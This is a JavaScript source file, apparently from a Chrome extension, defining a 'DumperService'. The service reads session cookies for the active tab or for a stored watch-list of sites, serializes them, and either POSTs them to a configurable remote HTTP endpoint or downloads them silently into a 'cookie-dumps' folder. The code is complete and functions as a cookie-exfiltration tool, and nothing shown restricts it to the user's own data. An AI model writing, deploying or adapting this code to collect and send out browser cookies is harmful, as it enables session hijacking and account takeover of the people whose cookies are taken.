import {
  cookiesService,
  extensionStorage,
  cryptoService,
} from "./composition.root.js";
import { getHostname, getTimestampString } from "../utils/utils.js";

export class DumperService {
  async dumpTab() {
    const tab = await extensionStorage.getActiveTab();
    const mode = await extensionStorage.getMode();
    const endpoint = await extensionStorage.getHttpEndpoint();

    if (!endpoint && mode == "http") return "No endpoint configured";
    if (!tab || !tab.url) return "No active tab URL.";

    const hostname = getHostname(tab.url);
    if (!hostname) return "Cannot parse hostname.";

    const cookies = await cookiesService.readCookiesForHostname(hostname);
    const groupedCookies = cookiesService.groupCookiesBySite(cookies);
    const decryptedJson = await cryptoService.secureSerializePayload(
      groupedCookies
    );

    switch (mode) {
      case "http":
        return await this._sendHttp(endpoint, decryptedJson);
      case "file":
        return await this._sendFile(decryptedJson);
    }
  }

  async dumpAll() {
    const endpoint = await extensionStorage.getHttpEndpoint();
    const mode = await extensionStorage.getMode();

    if (!endpoint && mode == "http") return "No endpoint configured";

    try {
      const cookies = await cookiesService.readWatchedCookies();
      const groupedCookies = cookiesService.groupCookiesBySite(cookies);
      const decryptedJson = await cryptoService.secureSerializePayload(
        groupedCookies
      );

      if (!cookies.length) return "No cookies stored";
      switch (mode) {
        case "http":
          return await this._sendHttp(endpoint, decryptedJson);
        case "file":
          return await this._sendFile(decryptedJson);
      }
    } catch (e) {
      console.error("Failed to send cookies:", e);
      return "Failed to send cookies";
    }
  }

  async _sendHttp(endpoint, decryptedJson) {
    const response = await fetch(endpoint, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: decryptedJson,
    });

    if (!response.ok) {
      console.error(`Request failed with status ${response.status}`);
      return "Failed to send cookies";
    }

    return "Cookies sent";
  }

  async _sendFile(decryptedJson) {
    const jsonString =
      typeof decryptedJson === "string"
        ? decryptedJson
        : JSON.stringify(decryptedJson || {}, null, 2);

    const url =
      "data:application/json;charset=utf-8," + encodeURIComponent(jsonString);
    const filename = `cookie-dumps/${getTimestampString()}.json`;

    return new Promise((resolve) => {
      chrome.downloads.download(
        {
          url,
          filename,
          saveAs: false,
        },
        () => {
          if (chrome.runtime.lastError) {
            console.error("Download error:", chrome.runtime.lastError);
            resolve("Failed to save cookies");
            return;
          }
          resolve("Cookies saved to file");
        }
      );
    });
  }
}
